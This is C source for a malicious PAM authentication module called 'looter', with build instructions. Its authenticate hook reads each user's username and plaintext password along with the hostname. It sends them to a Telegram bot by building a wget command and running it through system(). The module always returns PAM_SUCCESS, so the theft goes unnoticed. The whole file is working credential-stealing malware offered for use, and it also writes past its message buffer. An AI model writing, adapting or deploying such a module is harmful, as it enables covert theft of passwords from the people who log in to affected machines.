//compile the file using:
// gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter.c
//
//the m32 switch compile the program for 32bit arch
// you need to install gcc-multilib on a 64bit arch
//
//Dependecies: PAM library
// libpam0g-dev
//
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
  return size * nmemb;
}

void sendMessage(char (*message)[]) {
  char wget[500];

  //INSERT HERE YOUR BOT KEY
  char token[200] = "<ask to @bothfather>";

  //INSERT HERE YOUR USER ID: ask to @userinfobot
  int user_id = 0000001;
  //spider mode (dont' download), redirecte the output to the void  
  sprintf(wget,"wget --spider \"https://api.telegram.org/bot%s/sendMessage?chat_id=%d&text=%s\" -o /dev/null",token, user_id, *message);
  

  system(wget);
  
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  gethostname(hostname, sizeof hostname);
  snprintf(message,2048,"HostN: %s\nUser: %s\nPasswd: %s\n",hostname,username,password);
  sendMessage(&message);
  return PAM_SUCCESS;
}
